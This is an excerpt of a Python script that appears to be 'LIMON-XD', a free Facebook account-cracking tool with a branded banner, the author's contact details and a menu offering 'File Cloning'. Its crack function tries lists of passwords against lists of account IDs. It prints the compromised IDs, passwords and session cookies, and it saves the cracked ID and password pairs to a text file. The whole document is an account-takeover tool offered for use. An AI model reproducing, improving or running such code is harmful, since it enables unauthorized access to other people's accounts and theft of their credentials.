...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mLIMON')
...
os.system('xdg-open https://www.facebook.com/LIMON.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\db      d888888b .88b  d88.  .d88b.  d8b   db 
88        `88'   88'YbdP`88 .8P  Y8. 888o  88 
88         88    88  88  88 88    88 88V8o 88 
88         88    88  88  88 88    88 88 V8o88 
88booo.   .88.   88  88  88 `8b  d8' 88  V888 
Y88888P Y888888P YP  YP  YP  `Y88P'  VP   V8P 
...
[~] Github   : Sarder-limon
[~] Version  : 30.0
[~] Whatsapp : 01615453310
[~] Tool     : Free
\033[1;37m--------------------------------------------------""")
def login():
	banner()
	LIMONj('\033[1;97m[1] File Cloning\n\033[1;97m[2] Contact With Admin\n\033[1;97m[0] \033[1;97mEXIT ')
	LIMONj('\033[0;97m===============================================')
	LIMON= input('\033[1;97m[+] CHOOSE: ');time.sleep(0.01)
	if LIMON in ['m']:
		public()
	elif LIMON in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[LIMON-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#LIMON-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•LIMON-Cp] {idf} • {pw}')     
				...
				#LIMON-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•LIMON-Ok🖤] {idf} • {pw}\n\033[0;93m[🖤]= COOKIES •\x1b[1;91m{kuki} ')
				print('\x1b[1;91m==============================================================')
				os.system('espeak -a 300 " LIMON,  Ok,  id"')
				open(' /sdcard/LIMON-OK.txt','a').write(idf+'|'+pw+'\n')
